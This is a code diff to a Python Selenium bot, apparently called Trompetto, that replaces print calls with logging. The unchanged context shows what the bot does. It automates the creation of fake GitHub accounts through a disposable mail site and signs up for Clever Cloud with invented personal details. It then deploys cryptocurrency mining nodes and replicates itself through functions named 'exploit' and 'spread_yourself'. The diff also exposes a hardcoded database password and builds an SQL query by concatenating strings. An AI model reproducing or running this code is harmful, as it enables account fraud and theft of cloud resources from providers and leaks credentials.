@@ -7,6 +7,15 @@ from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
 import time
 from Crypto.PublicKey import RSA
 import psycopg2
+import logging
+
+logger = logging.getLogger()
+handler = logging.StreamHandler()
+formatter = logging.Formatter(
+        '%(asctime)s %(name)-12s %(levelname)-8s %(message)s')
+handler.setFormatter(formatter)
+logger.addHandler(handler)
+logger.setLevel(logging.INFO)
 
 app = Flask(__name__)
 
@@ -19,7 +28,6 @@ DB_NAME = "qrwvtvdu"
 ########################################################################################################################
 def screenshot(driver, fn):
     pass
-    #driver.save_screenshot("/Users/ash/Desktop/Trompetto/debug-screenshots/" + fn)
 
 class DriverWrapper(object):
     def __init__(self, uid, driver):
@@ -52,7 +60,7 @@ def create_browser():
             'browserName': "chrome",
             'version': "31"
         }
-        print("Connecting to grid: " + grid_username)
+        logger.info("Connecting to grid: " + grid_username)
         driver = webdriver.Remote(
             command_executor='http://'+grid_username+':'+grid_api_key+'@ondemand.saucelabs.com:80/wd/hub',
             desired_capabilities=desired_cap)
@@ -66,7 +74,7 @@ def create_browser():
         cur.close()
         conn.close()
 
-        print(" [^] Using Grid " + str(driver_uid) + "(" + grid_username + ").")
+        logger.info(" [^] Using Grid " + str(driver_uid) + "(" + grid_username + ").")
 
     driver.implicitly_wait(30)
     return driver
@@ -77,16 +85,16 @@ def create_browser():
 class TempMailClient(object):
     HOME_URL = "https://mytemp.email/2/"
     def __init__(self):
-        print(" [*] Connecting to disposable mail site...")
+        logger.info(" [*] Connecting to disposable mail site...")
         self.driver = create_browser()
         self.nav_home()
         email_input_element = self.driver.find_element_by_css_selector(".md-list-item-inner > span.truncate:nth-child(1)")
         self.mail_address = email_input_element.text
-        print(" [*] Temp Mail: " + self.mail_address)
+        logger.info(" [*] Temp Mail: " + self.mail_address)
         self.delete_all_mails()
 
     def delete_all_mails(self):
-        print(" [*] Delete all emails")
+        logger.info(" [*] Delete all emails")
         for list_of_emails in self.driver.find_elements_by_css_selector("md-list.emls"):
             list_of_emails.find_element_by_css_selector(".eml-icon-status").click()
 
@@ -108,7 +116,7 @@ class TempMailClient(object):
 ########################################################################################################################
 class CleverCloudManager(object):
     def restart(self):
-        print(" [$] Restarting Driver...")
+        logger.info(" [$] Restarting Driver...")
         self.driver.quit()
         self.driver = create_browser()
         self.driver.get("http://api.clever-cloud.com/v2/github/signup")
@@ -117,35 +125,35 @@ class CleverCloudManager(object):
         self.mail_client = mail_client
         self.github = github
         self.driver = create_browser()
-        print(" [*] Connecting to clever-cloud.com...")
+        logger.info(" [*] Connecting to clever-cloud.com...")
 
     def signup(self):
-        print(" [*] Signing up...")
+        logger.info(" [*] Signing up...")
         self.driver.get("http://api.clever-cloud.com/v2/github/signup")
         self.driver.find_element_by_css_selector("input#login_field").send_keys(self.github.account)
         self.driver.find_element_by_css_selector("input#password").send_keys(GITHUB_PASSWORD)
         self.try_click(".btn-primary")
-        print(" [*] Authorizing application...")
+        logger.info(" [*] Authorizing application...")
 
         if not self.driver.title == "Console - Clever Cloud":
             self.try_click(".btn-primary")
             self.driver.get("https://api.clever-cloud.com/v2/session/signup")
             self.try_click(".btn-github")
-            print( " [*] Accepting terms & conditions.")
+            logger.info( " [*] Accepting terms & conditions.")
             self.try_click("input#legals")
-            print(" [*] Creating account.")
+            logger.info(" [*] Creating account.")
             self.try_click(".btn-signup")
             if self.driver.title == "Sign up · Clever Cloud":
-                print(" [XXX] Error - retrying...")
+                logger.info(" [XXX] Error - retrying...")
                 self.driver.back()
                 time.sleep(3)
                 self.try_click("a.btn-github")
-                print(" [*] Accepting terms & conditions.")
+                logger.info(" [*] Accepting terms & conditions.")
                 self.try_click("input#legals")
                 time.sleep(2)
-                print(" [*] Accepted terms")
+                logger.info(" [*] Accepted terms")
                 self.try_click(".btn-finish-signup")
-                print(" [*] Loading PII form...")
+                logger.info(" [*] Loading PII form...")
 
 
         time.sleep(5)
@@ -153,7 +161,7 @@ class CleverCloudManager(object):
         time.sleep(30)
 
         try:
-            print (" [*] Filling out PII forms")
+            logger.info (" [*] Filling out PII forms")
             screenshot(self.driver, "pii.png")
 
             self.driver.find_element_by_css_selector("input#user-name").send_keys("Trompetto")
@@ -162,13 +170,13 @@ class CleverCloudManager(object):
             self.driver.find_element_by_css_selector("input#user-city").send_keys("Cupertino")
             self.driver.find_element_by_css_selector("input#user-zipcode").send_keys("12345")
 
-            print(" [*] Update PII")
+            logger.info(" [*] Update PII")
             self.try_click("button.update")
             time.sleep(2)
         except:
             pass
 
-        print (" [9] Clever Cloud Signup complete")
+        logger.info (" [9] Clever Cloud Signup complete")
 
     def create_selenium_hub(self):
         try:
@@ -184,7 +192,7 @@ class CleverCloudManager(object):
         self.driver.find_element_by_css_selector(".btn-primary").click()
 
         time.sleep(5)
-        print(" [*] Creating a brand new selenium hub")
+        logger.info(" [*] Creating a brand new selenium hub")
         self.driver.find_element_by_css_selector("span.dropdown-choice-value").click()
         time.sleep(1)
         self.driver.find_element_by_css_selector("div.input-search input").send_keys(Keys.ARROW_DOWN)
@@ -196,18 +204,18 @@ class CleverCloudManager(object):
         self.driver.find_element_by_css_selector('.next').click()
 
         self.driver.find_element_by_css_selector('.btn-blue').click()
-        print(" [*] Skip selenium add-ons")
+        logger.info(" [*] Skip selenium add-ons")
         self.driver.find_element_by_css_selector('.btn-blue').click()
-        print(" [*] Configure Environment")
+        logger.info(" [*] Configure Environment")
         self.driver.find_element_by_css_selector(".btn.edit").click()
         self.driver.find_element_by_css_selector('tr[data-variable="PORT"').send_keys("4444")
         self.driver.find_element_by_css_selector(".btn.save").click()
         self.driver.find_element_by_css_selector(".btn.next").click()
 
-        print(" [*] Trying to find domain name")
+        logger.info(" [*] Trying to find domain name")
         self.driver.find_element_by_css_selector("ul.settings li:nth-child(4)").click()
         self.grid_domain = self.driver.find_element_by_css_selector("ul.vhosts a").get_attribute("href")
-        print(" [*] Grid domain name:"+self.grid_domain)
+        logger.info(" [*] Grid domain name:"+self.grid_domain)
 
     def refresh(self):
         self.driver.refresh()
@@ -223,10 +231,10 @@ class CleverCloudManager(object):
             time.sleep(1)
             try:
                 ele.click()
-                print("  - pressed enter " + selector)
+                logger.info("  - pressed enter " + selector)
                 return True
             except:
-                print("  - can't find it yet.")
+                logger.info("  - can't find it yet.")
                 pass
         return False
 
@@ -235,10 +243,10 @@ class CleverCloudManager(object):
             time.sleep(1)
             try:
                 ele.click()
-                print("  - clicked " + selector)
+                logger.info("  - clicked " + selector)
                 return True
             except:
-                print("  - can't find it yet.")
+                logger.info("  - can't find it yet.")
                 pass
         try:
             self.driver.execute_script("document.querySelector('"+selector+"').click();")
@@ -259,7 +267,7 @@ class CleverCloudManager(object):
         time.sleep(1)
         self.driver.find_element_by_css_selector("div.input-search input").send_keys(Keys.ENTER)
         self.try_click('li[data-instance="python"')
-        print (" [*] Scalability config...")
+        logger.info (" [*] Scalability config...")
         time.sleep(5)
         self.driver.find_element_by_css_selector("body").click()
         time.sleep(1)
@@ -276,7 +284,7 @@ class CleverCloudManager(object):
                     action.click()
                     action.perform()
 
-        print(" [*] Information config...")
+        logger.info(" [*] Information config...")
         time.sleep(5)
         self.driver.find_element_by_css_selector("body").click()
         time.sleep(1)
@@ -289,16 +297,16 @@ class CleverCloudManager(object):
                     raise Exception("Couldn't press or click info config")
 
         time.sleep(5)
-        print(" [*] Ignore Add-ons")
+        logger.info(" [*] Ignore Add-ons")
         time.sleep(1)
         if not self.try_click("button.btn-blue"):
             raise Exception("Couldn't ignore add-ons")
 
-        print(" [*] Generating SSH Key")
+        logger.info(" [*] Generating SSH Key")
         key = RSA.generate(2048)
         str_key = str(key.publickey().exportKey('OpenSSH').decode('ascii'))
 
-        print(" [*] Uploading SSH Key")
+        logger.info(" [*] Uploading SSH Key")
         time.sleep(1)
         for ele in self.driver.find_elements_by_css_selector(".key-name input"):
             time.sleep(1)
@@ -316,13 +324,13 @@ class CleverCloudManager(object):
         time.sleep(1)
         self.try_click("button.btn-blue")
 
-        print(" [*] Skipping env config")
+        logger.info(" [*] Skipping env config")
         self.driver.find_element_by_css_selector("body").click()
         time.sleep(1)
         self.driver.find_element_by_css_selector("body").click()
         time.sleep(1)
         screenshot(self.driver, "before-first-blue-env.png")
-        print ("   -> Next")
+        logger.info ("   -> Next")
 
         if not self.try_click("button.btn.btn-blue.next"):
             if not self.try_press_enter("button.btn.btn-blue.next"):
@@ -347,7 +355,7 @@ class CleverCloudManager(object):
         self.driver.find_element_by_css_selector("div.input-search input").send_keys(Keys.ARROW_DOWN)
         self.driver.find_element_by_css_selector("div.input-search input").send_keys(Keys.ENTER)
         self.try_click('li[data-instance="node"')
-        print (" [*] Scalability config...")
+        logger.info (" [*] Scalability config...")
         time.sleep(5)
         self.driver.find_element_by_css_selector("body").click()
         time.sleep(1)
@@ -364,7 +372,7 @@ class CleverCloudManager(object):
                     action.click()
                     action.perform()
 
-        print(" [*] Information config...")
+        logger.info(" [*] Information config...")
         time.sleep(5)
         self.driver.find_element_by_css_selector("body").click()
         time.sleep(1)
@@ -377,16 +385,16 @@ class CleverCloudManager(object):
                     raise Exception("Couldn't press or click info config")
 
         time.sleep(5)
-        print(" [*] Ignore Add-ons")
+        logger.info(" [*] Ignore Add-ons")
         time.sleep(1)
         if not self.try_click("button.btn-blue"):
             raise Exception("Couldn't ignore add-ons")
 
-        print(" [*] Generating SSH Key")
+        logger.info(" [*] Generating SSH Key")
         key = RSA.generate(2048)
         str_key = str(key.publickey().exportKey('OpenSSH').decode('ascii'))
 
-        print(" [*] Uploading SSH Key")
+        logger.info(" [*] Uploading SSH Key")
         time.sleep(1)
         for ele in self.driver.find_elements_by_css_selector(".key-name input"):
             time.sleep(1)
@@ -417,7 +425,7 @@ class CleverCloudManager(object):
         time.sleep(5)
         self.driver.find_element_by_css_selector("body").send_keys(Keys.ENTER)
 
-        print(" [*] Skipping env config")
+        logger.info(" [*] Skipping env config")
         self.driver.find_element_by_css_selector("body").click()
         time.sleep(1)
         self.driver.find_element_by_css_selector("body").send_keys(Keys.TAB)
@@ -435,7 +443,7 @@ class CleverCloudManager(object):
         self.driver.find_element_by_css_selector("body").send_keys(Keys.TAB)
         time.sleep(1)
         screenshot(self.driver, "before-first-blue-env.png")
-        print ("   -> Next")
+        logger.info ("   -> Next")
 
         if not self.try_click("button.btn.btn-blue.next"):
             if not self.try_press_enter("button.btn.btn-blue.next"):
@@ -456,7 +464,7 @@ class CleverCloudManager(object):
 ########################################################################################################################
 class GitHubAccountManager(object):
     def __init__(self, mail_client):
-        print(" [*] Connecting to github.com...")
+        logger.info(" [*] Connecting to github.com...")
         self.driver = create_browser()
         self.driver.get("https://www.github.com")
         self.mail_client = mail_client
@@ -464,7 +472,7 @@ class GitHubAccountManager(object):
     def sign_up(self):
         self.mail_client.driver.refresh()
 
-        print(" [*] Signup for a github account...")
+        logger.info(" [*] Signup for a github account...")
         sign_up_button = self.driver.find_element_by_css_selector("div.site-header-actions > a.btn-primary")
         sign_up_button.click()
 
@@ -486,20 +494,20 @@ class GitHubAccountManager(object):
 
         self.driver.find_element_by_css_selector("#signup_button").click()
 
-        print(" [*] Created account: " + acc_name)
+        logger.info(" [*] Created account: " + acc_name)
 
         self.driver.find_element_by_css_selector(".js-choose-plan-submit").click()
 
-        print(" [*] Selected 'free' plan")
+        logger.info(" [*] Selected 'free' plan")
         self.mail_client.driver.refresh()
 
         self.driver.find_element_by_css_selector(".alternate-action").click()
 
-        print(" [*] Skipped developer survey.")
+        logger.info(" [*] Skipped developer survey.")
 
         time.sleep(3) #return with smart wait...
 
-        print(" [*] Verifying Github.com email...")
+        logger.info(" [*] Verifying Github.com email...")
         mailbox = self.mail_client.get_mail_list()
         mailbox.find_element_by_css_selector(".md-list-item-inner").click()
 
@@ -522,18 +530,18 @@ class GitHubAccountManager(object):
         self.account = acc_name
 
     def login(self):
-        print(" [*] Authenticating new github account...")
+        logger.info(" [*] Authenticating new github account...")
         self.driver.get("https://www.github.com")
         self.driver.find_element_by_css_selector("#login_field").send_keys(self.account)
         self.driver.find_element_by_css_selector("#password").send_keys(GITHUB_PASSWORD)
         self.driver.find_element_by_css_selector(".btn-primary").click()
 
     def fork_repo(self, repo_address):
-        print(" [*] Forking repo...")
+        logger.info(" [*] Forking repo...")
         self.driver.get("https://github.com/" + repo_address)
         form = self.driver.find_element_by_css_selector("form.btn-with-count")
         form.find_element_by_tag_name("button").click()
-        print(" [*] Queued repo fork")
+        logger.info(" [*] Queued repo fork")
 
     def to_home(self):
         self.driver.get("https://www.github.com")
@@ -573,7 +581,7 @@ def exploit(scale_up_factor):
             ccloud.create_mining_node()
             break
         except:
-            print("Failed... Retrying...")
+            logger.info("Failed... Retrying...")
             ccloud.restart()
 
     ccloud.driver.refresh()
@@ -588,13 +596,13 @@ def exploit(scale_up_factor):
     while True:
         try:
             for _ in range(0, scale_up_factor):
-                print("   >>> Spreading...")
+                logger.info("   >>> Spreading...")
                 time.sleep(5)
                 ccloud.driver.refresh()
                 ccloud.spread_yourself()
             break
         except:
-            print("Failed spread... Retrying...")
+            logger.info("Failed spread... Retrying...")
             break
 
 
@@ -607,7 +615,7 @@ def exploit(scale_up_factor):
     cur.execute(
         "INSERT INTO trompetto_node_list (uid, name_) VALUES ((SELECT COUNT(1) + 1 FROM trompetto_node_list), '" + github_acc_manager.account + "')")
     conn.commit()
-    print (" @PWNED: " + github_acc_manager.account)
+    logger.info (" @PWNED: " + github_acc_manager.account)
     cur.close()
     conn.close()
 
@@ -617,7 +625,7 @@ def get_connection():
             "dbname='qrwvtvdu' user='qrwvtvdu' host='elmer.db.elephantsql.com' password='phbDc2ttIVDvBpyS2Tkc1Oj3fB78PPnC'")
         return conn
     except:
-        print("Unexpected error connecting to DB.")
+        logger.info("Unexpected error connecting to DB.")
 
 ### Main App Entry Point
 def entrypoint():
@@ -639,16 +647,16 @@ def entrypoint():
     first_row = rows[0]
     number_of_live_nodes = first_row[0]
 
-    print("======== Configuration =========")
-    print("= Max Allowed Nodes:" + str(max_nodes))
-    print("= Wallet: " + wallet_address)
-    print("= Pool:" + pool_address)
-    print("= Current Grid Size: " + str(number_of_live_nodes))
-    print("= Scale Up Factor:" + str(scale_up_factor))
-    print("================================")
+    logger.info("======== Configuration =========")
+    logger.info("= Max Allowed Nodes:" + str(max_nodes))
+    logger.info("= Wallet: " + wallet_address)
+    logger.info("= Pool:" + pool_address)
+    logger.info("= Current Grid Size: " + str(number_of_live_nodes))
+    logger.info("= Scale Up Factor:" + str(scale_up_factor))
+    logger.info("================================")
 
     if number_of_live_nodes >= max_nodes:
-        print("Not allowed to create any more nodes, max reached!")
+        logger.info("Not allowed to create any more nodes, max reached!")
         exit(0)
 
     cur.close()
@@ -665,7 +673,7 @@ def pyver():
   return platform.python_version()
 
 if __name__ == "__main__":
-  print("#Before app.run()")
+  logger.info("#Before app.run()")
   entrypoint()
   app.run()
-  print("##### After app.run()")
+  logger.info("##### After app.run()")
